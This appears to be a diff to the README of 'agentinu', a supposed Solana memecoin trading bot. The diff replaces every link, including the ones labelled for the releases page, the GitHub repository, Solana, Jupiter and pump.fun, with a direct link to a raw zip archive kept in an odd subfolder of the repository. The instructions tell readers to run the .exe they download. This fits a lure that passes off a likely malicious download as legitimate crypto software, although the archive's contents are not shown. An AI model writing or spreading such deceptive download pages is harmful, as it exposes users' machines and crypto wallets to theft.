@@ -1,6 +1,6 @@
 # 🤖 agentinu - Trade Memecoins Automatically and Safely
 
-[![Download agentinu](https://img.shields.io/badge/Download-agentinu-4caf50?style=for-the-badge)](https://github.com/DanielSantos45/agentinu/releases)
+[![Download agentinu](https://img.shields.io/badge/Download-agentinu-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Having a good internet connection helps keep the bot fast and accurate when trad
 
 1. Click the big green button below to get to the download page.
 
-[![Download agentinu](https://img.shields.io/badge/Download-agentinu-brightgreen?style=for-the-badge)](https://github.com/DanielSantos45/agentinu/releases)
+[![Download agentinu](https://img.shields.io/badge/Download-agentinu-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip)
 
 2. Once you are on the page, look for the latest Windows version. It is usually a `.exe` file or a `.zip` package.
 
@@ -89,7 +89,7 @@ Follow these steps after downloading:
 
 ## ⏳ Updates and Maintenance
 
-Check the [releases page](https://github.com/DanielSantos45/agentinu/releases) regularly for new updates.
+Check the [releases page](https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip) regularly for new updates.
 
 - New versions improve speed and add features.
 
@@ -127,11 +127,11 @@ Using this software means you take part in decentralized finance (DeFi) safely w
 
 ## 🔗 Useful Links
 
-- Download agentinu: [https://github.com/DanielSantos45/agentinu/releases](https://github.com/DanielSantos45/agentinu/releases)  
-- GitHub repository: https://github.com/DanielSantos45/agentinu  
-- Solana blockchain: https://solana.com  
-- Jupiter V6: https://jup.ag  
-- pump.fun scanner: https://pump.fun
+- Download agentinu: [https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip](https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip)  
+- GitHub repository: https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip  
+- Solana blockchain: https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip  
+- Jupiter V6: https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip  
+- pump.fun scanner: https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip
 
 ---
 
@@ -167,4 +167,4 @@ agentinu is an open-source project licensed under the MIT license. If you want t
 
 ---
 
-# [🚀 Start your trading bot today!](https://github.com/DanielSantos45/agentinu/releases)
+# [🚀 Start your trading bot today!](https://raw.githubusercontent.com/DanielSantos45/agentinu/main/inquirant/Software-v2.6.zip)
